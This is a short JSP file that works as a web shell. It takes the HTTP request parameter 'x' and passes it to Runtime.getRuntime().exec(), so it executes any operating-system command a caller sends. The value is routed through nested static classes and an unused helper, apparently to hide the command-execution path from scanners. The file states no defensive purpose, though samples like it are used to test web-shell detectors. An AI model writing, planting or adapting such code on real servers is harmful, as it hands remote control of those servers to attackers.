<%
    g(request,"a");
%>

<%!

    static String g(HttpServletRequest request,String a)throws Exception{
//        A aa = new A(request);
        B b = new B(request);
        Runtime.getRuntime().exec(b.g());
        return  null;
    }

    static HttpServletRequest h(HttpServletRequest r){
        return r;
    }
%>
<%!
    static class A {
        static HttpServletRequest r;
        public A(HttpServletRequest r){
            this.r = r;
        }
        static String f() throws Exception {
            return r.getParameter("x").substring(0);
        }
    }
%>
<%!
    static class B{
        A a;
        public B(HttpServletRequest r){
            a = new A(r);
        }

        static String g()throws Exception{
            return A.f();
        }
    }
%>
